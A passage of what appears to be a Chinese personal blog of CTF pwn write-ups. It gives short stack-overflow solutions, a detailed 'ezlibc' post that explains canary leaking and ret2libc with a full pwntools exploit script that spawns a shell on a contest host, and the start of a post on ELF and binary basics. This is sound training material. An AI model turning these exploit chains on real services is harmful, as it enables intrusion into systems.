+<h1 id="5-GFCTF-2021-where-is-shell"><a href="#5-GFCTF-2021-where-is-shell" class="headerlink" title="5.[GFCTF 2021]where_is_shell"></a>5.[GFCTF 2021]where_is_shell</h1><p>Checksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，</p>
+<p>&#x2F;bin&#x2F;sh的地址为<img src="/2025/01/19/wp/wps2.jpg" alt="img"></p>
+<p><img src="/2025/01/19/wp/wps3.jpg" alt="img"> </p>
+<p>pop rdi；ret地址</p>
+<p><img src="/2025/01/19/wp/wps4.jpg" alt="img"> </p>
+<p>还需要栈对齐需要</p>
+<p><img src="/2025/01/19/wp/wps5.jpg" alt="img"> </p>
+<p>Exp模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote（）</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">8</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/wp/wps6.jpg" alt="img"> </p>
+<h1 id="6-NSSCTF-2022-Spring-Recruit-R3m4ke"><a href="#6-NSSCTF-2022-Spring-Recruit-R3m4ke" class="headerlink" title="6.[NSSCTF 2022 Spring Recruit]R3m4ke?"></a>6.[NSSCTF 2022 Spring Recruit]R3m4ke?</h1><p>checksec查看<img src="/2025/01/19/wp/wps7.jpg" alt="img"></p>
+<p>Ida打开，发现危险函数gets栈溢出</p>
+<p>有&#x2F;bin&#x2F;sh字符串非常简单的栈溢出</p>
+<p>找到system的地址栈溢出返回到system地址</p>
+<p><img src="/2025/01/19/wp/wps8.jpg" alt="img"> </p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps9.jpg" alt="img"> </p>
+<h1 id="7-HNCTF-2022-Week1-easyoverflow"><a href="#7-HNCTF-2022-Week1-easyoverflow" class="headerlink" title="7.[HNCTF 2022 Week1]easyoverflow"></a>7.[HNCTF 2022 Week1]easyoverflow</h1><p>Checksec</p>
+<p><img src="/2025/01/19/wp/wps10.jpg" alt="img"> </p>
+<p>Ida打开发现gets危险函数，可以溢出，发现cat flag字符串可以作为返回地址</p>
+<p>地址：<img src="/2025/01/19/wp/wps11.jpg" alt="img"></p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps12.jpg" alt="img"> </p>
+<h1 id="8-WUSTCTF-2020-getshell"><a href="#8-WUSTCTF-2020-getshell" class="headerlink" title="8.[WUSTCTF 2020]getshell"></a>8.[WUSTCTF 2020]getshell</h1><p>Checksec</p>
+<p><img src="/2025/01/19/wp/wps13.jpg" alt="img"> </p>
+<p>Ida</p>
+<p>发现<img src="/2025/01/19/wp/wps14.jpg" alt="img"></p>
+<p>可以栈溢出，发现&#x2F;bin&#x2F;sh字符串，地址<img src="/2025/01/19/wp/wps15.jpg" alt="img"></p>
+<p>Exp</p>
+<p><img src="/2025/01/19/wp/wps16.jpg" alt="img"> </p>
+<h1 id="9-GDOUCTF-2023-EASY-PWN"><a href="#9-GDOUCTF-2023-EASY-PWN" class="headerlink" title="9.[GDOUCTF 2023]EASY PWN"></a>9.[GDOUCTF 2023]EASY PWN</h1><p>Ida分析发现是随机生成一个数字，猜数字</p>
+<p>发现gets函数，可以栈溢出</p>
+<p>Shift+f12发现后门flag.txt </p>
+<p>找到地址0x0011D5 </p>
+<p>直接溢出</p>
+<p>Exp如下</p>
+<p><img src="/2025/01/19/wp/wps17.jpg" alt="img"> </p>
+<h1 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10.others_shellcode"></a>10.others_shellcode</h1><p> checksec查看</p>
+<p><img src="/2025/01/19/wp/wps18.jpg" alt="wps18"></p>
+<p>Ida查看</p>
+<p>没有看懂</p>
+<p>Nc一下</p>
+<p><img src="/2025/01/19/wp/wps19.jpg" alt="wps19"></p>
+<p>直接出来了，非常神奇</p>
+<p>搜了一下wp</p>
+<p><img src="/2025/01/19/wp/wps20.jpg" alt="wps20"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/18/ezlibc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/18/ezlibc/" class="post-title-link" itemprop="url">2024湘岚杯ezlibc</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-18 18:05:32" itemprop="dateCreated datePublished" datetime="2025-01-18T18:05:32+08:00">2025-01-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-01-25 23:08:48" itemprop="dateModified" datetime="2025-01-25T23:08:48+08:00">2025-01-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%AC%E4%BA%8C%E5%91%A8/" itemprop="url" rel="index"><span itemprop="name">第二周</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="/2025/01/18/ezlibc/image-20250118204042289.png" alt="image-20250118204042289"></p>
+<p><img src="/2025/01/18/ezlibc/image-20250119000301446.png" alt="image-20250119000301446"></p>
+<p>本题是Canary保护+ret2libc，根据这个题目来总结一下canary保护和ret2libc</p>
+<h1 id="Canary保护"><a href="#Canary保护" class="headerlink" title="Canary保护"></a>Canary保护</h1><h2 id="（1）Canary介绍"><a href="#（1）Canary介绍" class="headerlink" title="（1）Canary介绍"></a>（1）Canary介绍</h2><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p>
+<h2 id="（2）Canary原理"><a href="#（2）Canary原理" class="headerlink" title="（2）Canary原理"></a>（2）Canary原理</h2><p>当函数开始执行时，会在内存某处插入一组随机数canary（一般是 寄存器<strong>fs: 0x28</strong> 处，栈中 %ebp-0x8 的位置），我们在直接进行栈溢出时canary的值就会改变，在函数退栈返回前，程序会比对栈上的canary副本和原始的canary。如果二者不同，则说明发生了栈溢出，这时程序会直接崩溃，调用__stack_chk_fail函数来终止程序</p>
+<p><img src="/2025/01/18/ezlibc/image-20250118195529093.png" alt="image-20250118195529093"></p>
+<p><img src="/2025/01/18/ezlibc/image-20250118195650040.png" alt="image-20250118195650040"></p>
+<h2 id="（3）Canary绕过"><a href="#（3）Canary绕过" class="headerlink" title="（3）Canary绕过"></a>（3）Canary绕过</h2><p>我们知道在进行栈溢出时Canary的值已经改变，但函数退栈返回前程序会比对Canary的值，我们可以先把Canary泄露出来，进行栈溢出时候，再把Canary的值发送，这样Canary的值就不会改变</p>
+<h2 id="（4）Canary特点"><a href="#（4）Canary特点" class="headerlink" title="（4）Canary特点"></a>（4）Canary特点</h2><p>Canary所生成的随机数有一个非常重要的特点：随机数的第一个字节必然是 0x00。如此设计的主要目的是实现字符串截断，当我们进行泄露时遇到0x00直接就停止了，但是我们进行栈溢出时，可以多发送一个字节，使\x00被覆盖，这样我们就可以成功的将Canary泄露出来</p>
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="（1）题目特点"><a href="#（1）题目特点" class="headerlink" title="（1）题目特点"></a>（1）题目特点</h2><p>进行栈溢出时，程序可能没有后门函数，可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，我们就无法拿到shell，但是我们可以借助libc库将其真实地址计算出来</p>
+<h2 id="（2）解题思路"><a href="#（2）解题思路" class="headerlink" title="（2）解题思路"></a>（2）解题思路</h2><p>我们知道<strong>函数的真实地址  &#x3D;  基地址  +  偏移地址</strong> ，如果我们知道每次程序运行的基地址，以及每个函数的偏移地址，我们就可以计算出函数的真实地址</p>
+<p>基地址：每次运行程序加载函数时，函数的基地址都会发生改变</p>
+<p>偏移地址：libc库中存放的就是这些函数的偏移地址，函数真实地址的后三位不会变化，根据其最后三位借助，可以判断出libc库的版本</p>
+<p>查询libc版本网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search</a></p>
+<p>使用方法：输入函数名称和真实地址</p>
+<p><strong>如何计算基地址：</strong></p>
+<p>我们知道<strong>基地址 &#x3D; 函数的真实地址 - 偏移地址</strong></p>
+<p>我们可以借助puts(),write()这样的函数将某个函数的真实地址打印出来（即got表中存放的地址），由于Linux的动态延迟绑定技术，我们必须选择一个main函数中已经执行过的函数，一般选择puts和write</p>
+<h2 id="（4）plt表和got表"><a href="#（4）plt表和got表" class="headerlink" title="（4）plt表和got表"></a>（4）plt表和got表</h2><p> PLT表（Procedure Linkage Table）：PLT表用于实现函数调用的延迟绑定。当程序调用一个外部函数时，首先会跳转到PLT表中的相应条目，PLT表中的代码会检查GOT表中该函数地址是否已经解析。如果已经解析，就直接跳转到GOT表中的实际函数地址；如果尚未解析，就会触发动态链接器进行解析操作，然后更新GOT表并完成函数调用</p>
+<p>GOT表（Global Offset Table）：GOT表用于存放外部函数和全局变量的地址。GOT表在动态链接过程中起着关键作用，它允许程序在运行时查找和调用外部函数。</p>
+<p>在这里引用一张大佬的图解释</p>
+<p><img src="/2025/01/18/ezlibc/7c408d1075cd4b156225c0daa6a3434b.png" alt="img"></p>
+<h2 id="（5）延迟绑定"><a href="#（5）延迟绑定" class="headerlink" title="（5）延迟绑定"></a>（5）延迟绑定</h2><p>定义：延迟绑定（Lazy Binding）是一种在程序运行过程中动态链接共享库函数的技术。它的核心思想是推迟对外部函数（位于共享库中的函数）的地址解析，直到程序首次调用该函数时才进行解析。这样做的主要目的是为了提高程序的启动速度，因为如果在程序启动时就对所有可能用到的外部函数进行地址解析，会花费大量时间，而且很多函数可能在程序运行过程中根本不会被调用</p>
+<p>调用函数A的过程</p>
+<p>首次调用：</p>
+<p><img src="/2025/01/18/ezlibc/ad67f17c70087b8151988d5e0ddc8fbe.png" alt="img"></p>
+<p>再次调用:</p>
+<p><img src="/2025/01/18/ezlibc/3110f76e0ccc12a6ab1f26904138b18c.png" alt="img"></p>
+<h2 id="（6）总结"><a href="#（6）总结" class="headerlink" title="（6）总结"></a>（6）总结</h2><p>1.找到一个main函数中已经执行过的函数，构造payload1调用puts或write将其真实地址打印出来，根据真实地址确定libc版本，以及函数的偏移地址</p>
+<p>2.根据基地址&#x3D;真实地址-偏移地址</p>
+<p>3.根据真实地址&#x3D;基地址+偏移地址算出system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址</p>
+<p>4.构造payload2，劫持程序，拿到shell</p>
+<h1 id="exp以及解释"><a href="#exp以及解释" class="headerlink" title="exp以及解释"></a>exp以及解释</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./ezlibc&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ezlibc&quot;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;xlctf.huhstsec.top&#x27;</span>,<span class="number">40657</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload1:泄露canary</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>)+<span class="string">b&#x27;b&#x27;</span>                                 <span class="comment">#多发送一个b来覆盖canary的\x00</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;flag!&#x27;</span>)</span><br><span class="line">io.send(payload1);                                            <span class="comment">#这里不能用sendline，因为回车会占字节</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)                                           <span class="comment">#定位到Canary之前</span></span><br><span class="line">canary=u64(<span class="string">b&#x27;\x00&#x27;</span>+io.recv(<span class="number">7</span>))                                <span class="comment">#接受canary将\x00重新填上，再接受7个字节，并转换为64位</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x400843</span></span><br><span class="line">ret_addr=<span class="number">0x000000000040059e</span>               </span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]                                      <span class="comment">#查找puts函数plt表的地址</span></span><br><span class="line">main_addr=<span class="number">0x4006e7</span></span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]                                      <span class="comment">#查找puts函数got表的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&quot;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;plt_got:&quot;</span>,<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2:泄露puts真实地址</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>                     <span class="comment">#先覆盖到到canary之前，再将canary发送</span></span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)                 <span class="comment">#将puts函数got表的地址储存在寄存器rdi里  </span></span><br><span class="line">payload2+=p64(puts_plt)                                       <span class="comment">#调用puts函数</span></span><br><span class="line">payload2+=p64(main_addr)                                      <span class="comment">#最后返回到main，再次进行栈溢出  </span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Maybe UR closer to the key&quot;</span>)                     </span><br><span class="line">io.sendline(payload2)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment">#接收puts函数的真实地址，从7f开始接收，长度补足8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;real addr:&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)                           <span class="comment">#查询libc版本</span></span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)                              <span class="comment">#计算基地址</span></span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)                               <span class="comment">#计算system函数地址</span></span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)                           <span class="comment">#计算/bin/sh字符串地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload3：构造调用system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>      </span><br><span class="line">payload3+=p64(ret_addr)                                       <span class="comment">#栈平衡</span></span><br><span class="line">payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)                   <span class="comment">#将/bin/sh的地址储存在rdi寄存器中</span></span><br><span class="line">payload3+=p64(system)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="最后题目为我们提供Libc版本-so文件-与-不提供的区别"><a href="#最后题目为我们提供Libc版本-so文件-与-不提供的区别" class="headerlink" title="最后题目为我们提供Libc版本.so文件, 与 不提供的区别"></a>最后题目为我们提供Libc版本.so文件, 与 不提供的区别</h1><h2 id="（1）当题目不提供libc-so文件我们就需要借助LibcSearche库"><a href="#（1）当题目不提供libc-so文件我们就需要借助LibcSearche库" class="headerlink" title="（1）当题目不提供libc.so文件我们就需要借助LibcSearche库"></a>（1）当题目不提供libc.so文件我们就需要借助LibcSearche库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  </span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)                              <span class="comment">#计算基地址</span></span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)                               <span class="comment">#计算system函数地址</span></span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)                           <span class="comment">#计算/bin/sh字符串地址</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-当题目提供libc-so文件"><a href="#2-当题目提供libc-so文件" class="headerlink" title="(2)当题目提供libc.so文件"></a>(2)当题目提供libc.so文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]                              <span class="comment">#计算基地址</span></span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]                               <span class="comment">#计算system函数地址</span></span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))           <span class="comment">#计算/bin/sh字符串地址</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>canary：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43713800/article/details/105273284">canary介绍与绕过技巧_金丝雀漏洞缓解-CSDN博客</a></p>
+<p>​	      <a target="_blank" rel="noopener" href="https://blog.csdn.net/wangxunyu6/article/details/135682410">pwn入门之canary保护_pwn canary-CSDN博客</a></p>
+<p>ret2libc:<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/134872403">pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客</a></p>
+<p>exp:[【PWN · ret2libc | Canary】<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon/article/details/131098575">2021 鹤城杯]littleof-CSDN博客</a></p>
+<p>区别：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45556441/article/details/115207142">CTF(Pwn) 当题目为我们提供Libc版本.so文件, 与 不提供的区别_ctf题中.so文件-CSDN博客</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">二进制基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-14 15:16:45" itemprop="dateCreated datePublished" datetime="2025-01-14T15:16:45+08:00">2025-01-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-07 13:32:51" itemprop="dateModified" datetime="2025-02-07T13:32:51+08:00">2025-02-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%AC%E4%B8%80%E5%91%A8/" itemprop="url" rel="index"><span itemprop="name">第一周</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一、程序的编译与链接"><a href="#一、程序的编译与链接" class="headerlink" title="一、程序的编译与链接"></a>一、程序的编译与链接</h1><p>从C源代码到可执行文件的生成过程 </p>
+<p>编译： 由C语言代码生成汇编代码 </p>
+<p>汇编： 由汇编代码生成机器码 </p>
+<p>链接 ：将多个机器码的目标文件链接成一个可执行文件</p>
+<p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
+<p>​                                           C语言→汇编语言→机器码</p>
+<h1 id="二、Linux下的可执行文件格式"><a href="#二、Linux下的可执行文件格式" class="headerlink" title="二、Linux下的可执行文件格式"></a>二、Linux下的可执行文件格式</h1><h2 id="（1）什么是可执行文件？"><a href="#（1）什么是可执行文件？" class="headerlink" title="（1）什么是可执行文件？"></a>（1）什么是可执行文件？</h2><p>广义：文件中的数据是可执行文件 </p>
+<p>例：</p>
+<table>
+<thead>
+<tr>
+<th>.out</th>
+<th>.exe</th>
+<th>.sh</th>
+<th>.py</th>
+</tr>
+</thead>
+</table>
+<p>狭义：文件中的数据是机器码的文件 </p>
+<p>例：</p>
+<table>
+<thead>
+<tr>
+<th>.out</th>
+<th>.exe</th>
+<th>.dll</th>
+<th>.so</th>
+</tr>
+</thead>
+</table>
+<p>.out .exe .dl .so </p>
+<h2 id="（2）可执行文件的分类"><a href="#（2）可执行文件的分类" class="headerlink" title="（2）可执行文件的分类"></a>（2）可执行文件的分类</h2><p>Windows：PE</p>
+<table>
+<thead>
+<tr>
+<th>可执行程序</th>
+<th>动态链接库</th>
+<th>静态链接库</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.exe</td>
+<td>.dll</td>
+<td>.lib</td>
+</tr>
+</tbody></table>
+<p>Linux：ELF</p>
+<table>
+<thead>
+<tr>
+<th>可执行程序</th>
+<th>动态链接库</th>
+<th>静态链接库</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.out</td>
+<td>.so</td>
+<td>.a</td>
+</tr>
+</tbody></table>
+<h2 id="（3）磁盘中的ELF与内存中的ELF"><a href="#（3）磁盘中的ELF与内存中的ELF" class="headerlink" title="（3）磁盘中的ELF与内存中的ELF"></a>（3）磁盘中的ELF与内存中的ELF</h2><p>磁盘中的储存方式：节</p>
+<p>内存中的储存方式：段</p>
+<p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/2.png" alt="2"></p>
+<table>
+<thead>
+<tr>
+<th>RW可写 Data段</th>
+<th>RX可读 Code段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.data</td>
+<td>.rodata</td>
+</tr>
+<tr>
+<td>.bss</td>
+<td>.text</td>
+</tr>
+<tr>
+<td>.got</td>
+<td>.int</td>
+</tr>
+<tr>
+<td>.plt</td>
+<td>ELF  Header</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>Stack</th>
+<th>Heap</th>
+<th>For Kernel</th>
+<th>STACK</th>
+<th>HEAP</th>
+<th>DATA</th>
+<th>CODE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用来管理函数调用的状态</td>
+<td>申请动态内存的调用</td>
+<td>操作系统代码</td>
+<td>栈段</td>
+<td>堆段</td>
+<td>数据段</td>
+<td>代码段</td>
+</tr>
+</tbody></table>
+<p>vmmap：查看程序进程的内存空间</p>
+<p>注：数据从低地址向高地址写 Heap：是从低往高增长 Stack：是从高往低增长（栈的增长方向是相反的）</p>
+<h1 id="三、进程虚拟地址空间"><a href="#三、进程虚拟地址空间" class="headerlink" title="三、进程虚拟地址空间"></a>三、进程虚拟地址空间</h1><p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/3.png" alt="3"></p>
+<h2 id="（1）地址编码"><a href="#（1）地址编码" class="headerlink" title="（1）地址编码"></a>（1）地址编码</h2><p>地址以字节编码，1Byte&#x3D;8bits，常以16进制表示</p>
+<h2 id="（2）二进制与十六进制转换"><a href="#（2）二进制与十六进制转换" class="headerlink" title="（2）二进制与十六进制转换"></a>（2）二进制与十六进制转换</h2><p>1.二进制转十六进制</p>
+<p>例：11010110</p>
+<p>从右往左每四位一组1101 0110，将二进制转换为十进制在对应为十六进制</p>
+<p>1101&#x3D;1×2³ + 1×2² + 0×2¹ + 1×2⁰ &#x3D;13&#x3D;D</p>
+<p>0110&#x3D;0×2³ + 1×2² + 1×2¹ + 0×2⁰&#x3D;6</p>
+<p>11010110&#x3D;D6</p>
+<p>2.十六进制转二进制</p>
+<p>例：2AF</p>
+<p>将每个十六进制的数转换为对应的四位二进制数，在组合起来</p>
+<p>2&#x3D;0010</p>
+<p>A&#x3D;10&#x3D;1010</p>
+<p>F&#x3D;15&#x3D;1111</p>
+<p>2AF&#x3D;0010 1010 1111</p>
+<h2 id="（3）虚拟内存"><a href="#（3）虚拟内存" class="headerlink" title="（3）虚拟内存"></a>（3）虚拟内存</h2><p>虚拟内存用户空间每个进程一份</p>
+<p>虚拟内存内核空间所有进程共享一份</p>
+<p>虚拟内存mmap段中的动态链接库仅在物理内存中装载一份</p>
+<h2 id="（4）段（segment）与节（section）"><a href="#（4）段（segment）与节（section）" class="headerlink" title="（4）段（segment）与节（section）"></a>（4）段（segment）与节（section）</h2><table>
+<thead>
+<tr>
+<th>代码段（Text segment）</th>
+<th>数据段（Data segment）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>包含了代码与只读数据</td>
